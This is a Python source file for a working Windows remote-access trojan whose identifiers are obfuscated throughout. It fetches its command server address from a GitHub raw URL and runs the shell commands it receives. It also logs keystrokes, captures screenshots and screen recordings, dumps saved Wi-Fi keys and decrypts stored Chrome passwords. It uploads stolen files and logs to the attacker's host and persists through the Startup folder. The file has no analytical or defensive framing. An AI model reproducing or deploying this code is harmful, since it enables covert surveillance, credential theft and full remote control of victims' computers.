import subprocess,socket,time,requests,os,logging,imageio,json,sqlite3,win32crypt,base64,shutil
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
from Cryptodome.Cipher import AES
hznmhOSvyZHboDOlOmPrSId = ""
xFNvYIwvbHhYWBYARzY = ""
UuhmhesbekQrTfXvP = "16.12.24.4"
DDwDJSIJnjParxybFldKoyF = "!"
HevjgTiLpWkSLHPUfXJ = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
JgWxXyTjbxRHq = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
CYRUkbWuhKmWSw = os.path.expanduser("~\\AppData\\Local\\")
def EarqUBojSBcou(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def MHddaDOTOtJmyCkfFyhXq(s):
	tcYjPIGwBcx = s.recv(1024)
	if len(tcYjPIGwBcx)==0:
		return True
	ZuLMjLTHXHlNwGmrb = tcYjPIGwBcx.decode("utf-8").replace("\n","")
	if not ZuLMjLTHXHlNwGmrb.startswith(DDwDJSIJnjParxybFldKoyF):
		proc = subprocess.run(ZuLMjLTHXHlNwGmrb, shell=True, capture_output=True)
		InYyHASPJuyeXPB = proc.stdout + proc.stderr
		s.send(InYyHASPJuyeXPB)
		return
	siMRadgFmUCf = ZuLMjLTHXHlNwGmrb.split(" ")[0][1:]
	args = " ".join(ZuLMjLTHXHlNwGmrb.split()[1:]).split()
	if siMRadgFmUCf == "download":
		eSJDDgPEsRDEk(s, ZuLMjLTHXHlNwGmrb)
	elif siMRadgFmUCf == "screenshot":
		sXxasMPZQXocSOHYVdwz(s)
	elif siMRadgFmUCf == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
	elif siMRadgFmUCf == "update":
		vBavSMhXnBMfJnoIClEPVQ(s)
	elif siMRadgFmUCf == "wifi":
		QfoCALrKTEk(s)
	elif siMRadgFmUCf == "screenrecord":
		fZqkohqnajBTyXJXDdiu(s, args)
	elif siMRadgFmUCf == "chrome":
		decryptPasswords(s)
def eSJDDgPEsRDEk(s, ZuLMjLTHXHlNwGmrb):
	gcezyLWYoMo = ZuLMjLTHXHlNwGmrb.replace(DDwDJSIJnjParxybFldKoyF+"download ","").split(",")
	InYyHASPJuyeXPBs = ""
	for f in gcezyLWYoMo:
		InYyHASPJuyeXPBs += AQtBbbrrpfcUmsHCdksfE(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(InYyHASPJuyeXPBs, "utf-8"))
def sXxasMPZQXocSOHYVdwz(s):
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	etCckQqHLyTJDnlOaRZdJA = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(etCckQqHLyTJDnlOaRZdJA)
	image.close()
	r = AQtBbbrrpfcUmsHCdksfE(etCckQqHLyTJDnlOaRZdJA, "api/sscap")
	os.remove(etCckQqHLyTJDnlOaRZdJA)
	s.send(bytes(r,"utf-8"))
def fZqkohqnajBTyXJXDdiu(s, args):
	vQPHSKoMPHskqukbwKTC = 15
	if not args == []:
		try: vQPHSKoMPHskqukbwKTC = int(args[0])
		except: pass
	WTBaKuIMboPjM = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	sAFHiVleHzIPIJGOsPGURM = []
	fps = 11
	numFrames = vQPHSKoMPHskqukbwKTC * fps
	for _ in range(numFrames):
		sAFHiVleHzIPIJGOsPGURM.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(WTBaKuIMboPjM, sAFHiVleHzIPIJGOsPGURM, fps=fps, quality=8)
	AQtBbbrrpfcUmsHCdksfE(WTBaKuIMboPjM, "api/screc")
def AQtBbbrrpfcUmsHCdksfE(YfBQMhQpOxOARzG, xHitqvmBrbeFzZUGbo, FxnwkdAqdUIRcgBT=None):
	if not os.path.isfile(YfBQMhQpOxOARzG):
		return "[!] 404: "+YfBQMhQpOxOARzG+"\n"
	headers = {"user":os.getlogin()}
	if FxnwkdAqdUIRcgBT is not None:
		headers = {**headers, **FxnwkdAqdUIRcgBT}
	f = open(YfBQMhQpOxOARzG, "rb")
	requests.post("http://"+hznmhOSvyZHboDOlOmPrSId+":5555/"+xHitqvmBrbeFzZUGbo,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200\n"
def vBavSMhXnBMfJnoIClEPVQ(s):
	h, p, v = YYaihNcYi(True)
	if (v != UuhmhesbekQrTfXvP):
		JhppElTeXkucZ(v)
		s.send(b"[+] 200\n")
	else:
		s.send(b"[-] 304\n")
def QfoCALrKTEk(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		s.send(b"[!] 500\n")
		return
	TYeXrbRqgpBoOyQGjURH = ""
	for p in profiles:
		try: TYeXrbRqgpBoOyQGjURH+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()+"\n"
		except: TYeXrbRqgpBoOyQGjURH+=f"    {p} - N/A\n"
	s.send(bytes(TYeXrbRqgpBoOyQGjURH, "utf-8"))
def JhppElTeXkucZ(dWsmvOmlAiculScODcXh):
	kusgeWaeFzQj = os.path.basename(__file__)
	fileType = kusgeWaeFzQj.split(".")[-1]
	CNWBuVvB = kusgeWaeFzQj.split(".")[0]+"."+dWsmvOmlAiculScODcXh+".pyw" if fileType.startswith("py") else ".exe"
	dYjzNeeBhhoqdGNu = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), CNWBuVvB)
	if not os.path.isfile(dYjzNeeBhhoqdGNu):
		with open(dYjzNeeBhhoqdGNu, "w+") as f:
			f.write(requests.get(JgWxXyTjbxRHq+"file."+ "pyw" if dYjzNeeBhhoqdGNu.split(".")[-1].startswith("py") else "exe").text)
def YYaihNcYi(force=False):
	global hznmhOSvyZHboDOlOmPrSId, xFNvYIwvbHhYWBYARzY
	if force or hznmhOSvyZHboDOlOmPrSId == "" or xFNvYIwvbHhYWBYARzY == "":
		tcYjPIGwBcx = requests.get(HevjgTiLpWkSLHPUfXJ).text.replace("\n","").split(":")
		hznmhOSvyZHboDOlOmPrSId = tcYjPIGwBcx[0].strip()
		xFNvYIwvbHhYWBYARzY = tcYjPIGwBcx[1].strip()
		dWsmvOmlAiculScODcXh = tcYjPIGwBcx[2].strip()
	return hznmhOSvyZHboDOlOmPrSId, xFNvYIwvbHhYWBYARzY, dWsmvOmlAiculScODcXh
def xGHuLfOYnImCtXwRx():
	try:
		CtncwqRhBbP = "settings.xpb"
		nlwSliPRjujkOMaJFaSVr = sorted([file for file in os.listdir(CYRUkbWuhKmWSw) if os.path.isfile(CYRUkbWuhKmWSw+"\\"+file) and file.endswith(CtncwqRhBbP.split(".")[-1])])
		if CtncwqRhBbP in nlwSliPRjujkOMaJFaSVr:
			nlwSliPRjujkOMaJFaSVr.remove(CtncwqRhBbP)
		XeicKBlQvRMGIseKfxkDkg = os.path.join(CYRUkbWuhKmWSw,CtncwqRhBbP)
		if len(nlwSliPRjujkOMaJFaSVr) > 0:
			with open(XeicKBlQvRMGIseKfxkDkg, "ab+") as f:
				for file in nlwSliPRjujkOMaJFaSVr:
					temp = os.path.join(CYRUkbWuhKmWSw,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		AQtBbbrrpfcUmsHCdksfE(XeicKBlQvRMGIseKfxkDkg, "api/log")
		if os.path.isfile(XeicKBlQvRMGIseKfxkDkg):
			os.remove(XeicKBlQvRMGIseKfxkDkg)
	except:
		pass
def ruxBYuOTvhtpObR():
	logging.basicConfig(filename=(CYRUkbWuhKmWSw+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def eRLoWYbckEctuJzfHBRAOzt(k):
		logging.info(str(k))
	k=Listener(on_press=eRLoWYbckEctuJzfHBRAOzt)
	fNVUMayQZIESSE = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in fNVUMayQZIESSE:
		l.setLevel(logging.CRITICAL)
	k.start()
def decryptPasswords(s):
	local = os.path.expanduser("~\\AppData\\Local\\")
	basePath = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\")
	enckey = None
	with open(basePath+"Local State", "r") as f:
		localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
		enckey = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
	shutil.copyfile(basePath+"\\Default\\Login Data", local+"\\db.db")
	conn = sqlite3.connect(local+"\\db.db")
	cursor = conn.cursor()
	cursor.execute("SELECT action_url, username_value, password_value FROM logins")
	logins = []
	for index, login in enumerate(cursor.fetchall()):
		ciphertext = login[2]
		initVector = ciphertext[3:15]
		encryptedPwd = ciphertext[15:-16]
		cipher = AES.new(enckey, AES.MODE_GCM, initVector)
		decryptedPwd = (cipher.decrypt(encryptedPwd)).decode()
		logins.append([login[0], login[1], decryptedPwd])
	cursor.close()
	conn.close()
	os.remove(local+"\\db.db")
	tcYjPIGwBcx = "\n"
	for login in logins:
		tcYjPIGwBcx += f"URL: {login[0]}\nUser: {login[1]}\nValue: {login[2]}\n\n"
	s.send(bytes(tcYjPIGwBcx,"utf-8"))
def OMnIPfx():
	h, p, v = YYaihNcYi()
	xGHuLfOYnImCtXwRx()
	if UuhmhesbekQrTfXvP != v:
		JhppElTeXkucZ(v)
	ruxBYuOTvhtpObR()
	bOlCPZnyyseAwUgG = bytes(("(old)"if UuhmhesbekQrTfXvP!=v else "")+"["+UuhmhesbekQrTfXvP+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				MNNHzHE=False
				try:
					s=EarqUBojSBcou(h, p)
					while not MNNHzHE:
						s.send(bOlCPZnyyseAwUgG)
						MNNHzHE=MHddaDOTOtJmyCkfFyhXq(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
OMnIPfx()
